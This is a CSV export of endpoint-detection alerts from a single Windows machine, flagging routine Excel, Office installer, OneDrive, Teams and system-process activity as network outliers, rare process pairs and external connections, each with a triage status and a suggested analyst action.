"Jun 1, 2026 @ 14:23:58.354",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E6FOATFZBWDOBUAHBQHBF3HHHFDUEVCF.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-84071BF4
"Jun 1, 2026 @ 14:23:58.353",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E6FOATFZBWDOBUAHBQHBF3HHHFDUEVCF.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-51B436E6
"Jun 1, 2026 @ 14:23:58.338",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GJBYANDADWASELCKHVHEGSDRFDANAYDC.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E61B2E4D
"Jun 1, 2026 @ 14:21:45.566",C:\Windows\System32\dllhost.exe,,,Rare Parent-Child,15,Rare process pair: -->dllhost.exe,,,,,,load,"35,120",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-13E98A04
"Jun 1, 2026 @ 14:21:45.478",C:\Windows\System32\dllhost.exe,C:\Windows\System32\svchost.exe,C:\Windows\system32\DllHost.exe /Processid:{F32D97DF-E3E5-4CB9-9E3E-0EB5B4E49801},Rare Parent-Child,15,Rare process pair: svchost.exe->dllhost.exe,,,,,,start,"35,120",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-72110BA7
"Jun 1, 2026 @ 14:21:44.385",C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x64.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x64.exe"" /quiet /norestart",Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->vc_redist.x64.exe,,,,,,start,"18,948",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-8761F950
"Jun 1, 2026 @ 14:21:23.446",C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"" /reporting",Rare Parent-Child,15,Rare process pair: svchost.exe->onedrivestandaloneupdater.exe,,,,,,end,"35,248",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-A7119D1A
"Jun 1, 2026 @ 14:21:23.421",C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"" /reporting",Rare Parent-Child,15,Rare process pair: svchost.exe->onedrivestandaloneupdater.exe,,,,,,end,"15,932",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-45FC36E0
"Jun 1, 2026 @ 14:23:59.610",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\ID\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0A841EC3
"Jun 1, 2026 @ 14:23:59.606",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\AT\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-97E18DD7
"Jun 1, 2026 @ 14:23:59.548",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\TokenBroker\Cache\37b6f4fee3fa6fedbe575e9ff4bef37707fcec8e.tbres,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F1CDEFA6
"Jun 1, 2026 @ 14:23:59.267",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\PlaceRequests_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E83E18B4
"Jun 1, 2026 @ 14:23:59.156",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\DocumentRequests_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-64795623
"Jun 1, 2026 @ 14:23:58.429",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\DQAMD5FIHGGVFZH4CND5DQEZEQCQBWGU.P,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B8E1AD00
"Jun 1, 2026 @ 14:23:58.428",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\DQAMD5FIHGGVFZH4CND5DQEZEQCQBWGU.P,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-861AEF47
"Jun 1, 2026 @ 14:23:58.420",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EOFLG3GFG2E4GMGMEOBIA3BQDEBPA6CN.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A619604F
"Jun 1, 2026 @ 14:23:58.412",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FUD4HIAAB2GVEQFCCQHDDGHZFAEYFXCZ.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E68719D9
"Jun 1, 2026 @ 14:23:58.405",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_A7BRHFHZBWH4EDA4C7DUA7HKEEAABQHJ.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-82D4FD98
"Jun 1, 2026 @ 14:23:58.398",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GWDZA3HMB7DBCNAPDOGIE4A7FIHMEKGK.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-26C28691
"Jun 1, 2026 @ 14:23:20.205",C:\Windows\System32\SearchFilterHost.exe,C:\Windows\System32\SearchIndexer.exe,"""C:\Windows\System32\SearchFilterHost.exe"" 888 2836 2832 872 {7FC3863B-7471-4B10-84E3-A5C2E0330618}",Rare Parent-Child,15,Rare process pair: searchindexer.exe->searchfilterhost.exe,,,,,,start,"28,780",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-226D6C3C
"Jun 1, 2026 @ 14:23:04.442",C:\Windows\System32\consent.exe,C:\Windows\System32\svchost.exe,consent.exe 8032 370 000001F84C42FDC0,Rare Parent-Child,15,Rare process pair: svchost.exe->consent.exe,,,,,,end,"7,972",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-D9259F73
"Jun 1, 2026 @ 14:23:01.316",C:\Windows\System32\consent.exe,C:\Windows\System32\svchost.exe,consent.exe 8032 370 000001F84C42FDC0,Rare Parent-Child,15,Rare process pair: svchost.exe->consent.exe,,,,,,start,"7,972",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-A3361E8B
"Jun 1, 2026 @ 14:22:49.041",C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe"" -RegisterComServerForEcsTask -Embedding",Rare Parent-Child,15,Rare process pair: svchost.exe->ms-teamsupdate.exe,,,,,,end,"11,132",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-443018BF
"Jun 1, 2026 @ 14:22:45.696",C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe"" -RegisterComServerForEcsTask -Embedding",Rare Parent-Child,15,Rare process pair: svchost.exe->ms-teamsupdate.exe,,,,,,start,"11,132",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-0878F6B3
"Jun 1, 2026 @ 14:23:34.564",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,,load,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5DC5ACCB
"Jun 1, 2026 @ 14:23:34.518",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\{C9880DC3-0C78-49B5-A3CF-253D3893D90D} - OProcSessId.dat,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0B9F7B5B
"Jun 1, 2026 @ 14:24:53.230",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,,,External Communication,15,Outbound to external IP: 52.98.123.226,173.10.254.170,52.98.123.226,,,,disconnect_received,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-05401814
"Jun 1, 2026 @ 14:24:18.621",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,,,External Communication,15,Outbound to external IP: 103.243.115.105,173.10.254.170,103.243.115.105,,,,disconnect_received,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-63F38D09
"Jun 1, 2026 @ 14:24:18.618",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,,,External Communication,15,Outbound to external IP: 103.243.115.105,173.10.254.170,103.243.115.105,,,,connection_attempted,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-F1F0D766
"Jun 1, 2026 @ 14:24:18.535",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,,,External Communication,15,Outbound to external IP: 52.98.123.226,173.10.254.170,52.98.123.226,,,,connection_attempted,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-5EF5EBC5
"Jun 1, 2026 @ 14:23:41.179",C:\Windows\System32\smartscreen.exe,,,External Communication,15,Outbound to external IP: 20.18.192.154,173.10.254.170,20.18.192.154,,,,disconnect_received,"20,548",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-CF3FC301
"Jun 1, 2026 @ 14:23:40.419",C:\Windows\System32\smartscreen.exe,,,External Communication,15,Outbound to external IP: 20.18.192.154,173.10.254.170,20.18.192.154,,,,connection_attempted,"20,548",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-655E1992
"Jun 1, 2026 @ 14:21:46.196",C:\Windows\System32\sppsvc.exe,C:\Windows\System32\services.exe,C:\Windows\system32\sppsvc.exe,Rare Parent-Child,15,Rare process pair: services.exe->sppsvc.exe,,,,,,end,"16,316",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-1054BA6F
"Jun 1, 2026 @ 14:21:45.882",C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x86.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x86.exe"" /quiet /norestart",Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->vc_redist.x86.exe,,,,,,start,"10,628",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-B379404B
"Jun 1, 2026 @ 14:21:45.864",C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x64.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x64.exe"" /quiet /norestart",Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->vc_redist.x64.exe,,,,,,end,"18,948",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-FE2929E7
"Jun 1, 2026 @ 14:24:00.317",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\2mvf8it,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-58310C3A
"Jun 1, 2026 @ 14:24:00.278",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\{0E7246AC-B082-45BC-8617-2194AD991F7B}.tmp,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BB83C6B2
"Jun 1, 2026 @ 14:24:00.267",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\{0E7246AC-B082-45BC-8617-2194AD991F7B}.tmp,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-66D8E112
"Jun 1, 2026 @ 14:23:59.900",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\Places_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5042DE66
"Jun 1, 2026 @ 14:23:59.882",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\MruServiceCache\b1c53643363b744d_LiveId\Excel\Documents_en-US,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B3FCEAD5
"Jun 1, 2026 @ 14:23:59.843",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E00A01ED
"Jun 1, 2026 @ 14:23:59.740",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,d.docs.live.net,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-3A9A7D6F
"Jun 1, 2026 @ 14:23:59.728",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,d.docs.live.net,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6D4E0E61
"Jun 1, 2026 @ 14:23:59.615",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\Accounts\r_74DB6FURNR2TGPBK.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-E7B732BB
"Jun 1, 2026 @ 14:21:06.249",C:\Windows\System32\sppsvc.exe,C:\Windows\System32\services.exe,C:\Windows\system32\sppsvc.exe,Rare Parent-Child,15,Rare process pair: services.exe->sppsvc.exe,,,,,,start,"16,316",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-FC6ABC54
"Jun 1, 2026 @ 14:22:48.400",C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe,,,External Communication,15,Outbound to external IP: 103.243.115.105,173.10.254.170,103.243.115.105,,,,disconnect_received,"11,132",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-1F3A223B
"Jun 1, 2026 @ 14:22:48.219",C:\Program Files\WindowsApps\MSTeams_26106.1911.4707.3286_x64__8wekyb3d8bbwe\ms-teamsupdate.exe,,,External Communication,15,Outbound to external IP: 103.243.115.105,173.10.254.170,103.243.115.105,,,,connection_attempted,"11,132",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Block destination IP at perimeter; review netflow,AH-5F301CAC
"Jun 1, 2026 @ 14:21:59.969",C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\OLicenseHeartbeat.exe,,,External Communication,15,Outbound to external IP: 20.42.65.90,173.10.254.170,20.42.65.90,,,,disconnect_received,"5,952",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-77AA49B6
"Jun 1, 2026 @ 14:21:58.960",C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\OLicenseHeartbeat.exe,,,External Communication,15,Outbound to external IP: 20.42.65.90,173.10.254.170,20.42.65.90,,,,connection_attempted,"5,952",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-F3808581
"Jun 1, 2026 @ 14:21:23.447",C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe,,,External Communication,15,Outbound to external IP: 52.168.112.66,173.10.254.170,52.168.112.66,,,,disconnect_received,"35,248",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-18EC4487
"Jun 1, 2026 @ 14:21:23.426",C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe,,,External Communication,15,Outbound to external IP: 52.168.112.66,173.10.254.170,52.168.112.66,,,,disconnect_received,"15,932",,,False,INFO,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-A35E4BA1
"Jun 1, 2026 @ 14:24:04.181",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,pin1-collabhubrtc.officeapps.live.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0806B65C
"Jun 1, 2026 @ 14:24:16.561",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\excel.exe.db-wal,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-18A75D1C
"Jun 1, 2026 @ 14:24:16.554",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\excel.exe.db-wal,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-26234622
"Jun 1, 2026 @ 14:24:16.553",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\excel.exe.db-shm,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-00822E6D
"Jun 1, 2026 @ 14:24:16.542",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\OTele\excel.exe.db-shm,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-3D73AF05
"Jun 1, 2026 @ 14:24:16.946",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.146,,,,disconnect_received,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BE7E2556
"Jun 1, 2026 @ 14:24:02.281",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-175067CC
"Jun 1, 2026 @ 14:24:02.279",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F80342E0
"Jun 1, 2026 @ 14:24:02.238",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-373796A3
"Jun 1, 2026 @ 14:24:02.006",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FGH3D6BBGYDLCAEVEUA3BOCAHSEQAUCZ.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F9F0BB8B
"Jun 1, 2026 @ 14:24:02.005",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FGH3D6BBGYDLCAEVEUA3BOCAHSEQAUCZ.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F64BFBD1
"Jun 1, 2026 @ 14:24:02.004",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CPFDGXDLA2DACGGSFYCFEADNHOASHOBA.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-514E6B6E
"Jun 1, 2026 @ 14:24:02.003",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CPFDGXDLA2DACGGSFYCFEADNHOASHOBA.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B83031C8
"Jun 1, 2026 @ 14:24:01.998",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HSFBEKF3BXBYDGCEHZC5HUF3AXAGCQCE.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-333E162F
"Jun 1, 2026 @ 14:24:01.996",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F2FNDEHMBCDBEPGJAWGLADBOB7BVD3A3.R,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BC7F347F
"Jun 1, 2026 @ 14:24:11.965",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\aggmru\b1c53643363b744d_LiveId\x-mru4-en-US-sr.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-97723127
"Jun 1, 2026 @ 14:24:04.158",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,pin1-collabhubrtc.officeapps.live.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-56A59044
"Jun 1, 2026 @ 14:24:03.049",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,cac-collabrtc.officeapps.live.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9498917E
"Jun 1, 2026 @ 14:24:02.970",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,cac-collabrtc.officeapps.live.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-F53A4C78
"Jun 1, 2026 @ 14:24:02.892",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\data.json,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7AE94FF9
"Jun 1, 2026 @ 14:24:02.889",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\2a5ae2d3b00dc85f60bf6c9e5197c6940ee9ce62.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-789F2CC1
"Jun 1, 2026 @ 14:24:14.317",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\Personalization\UserFacts\b1c53643363b744d_LiveId\Insights.json,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9B4F0A43
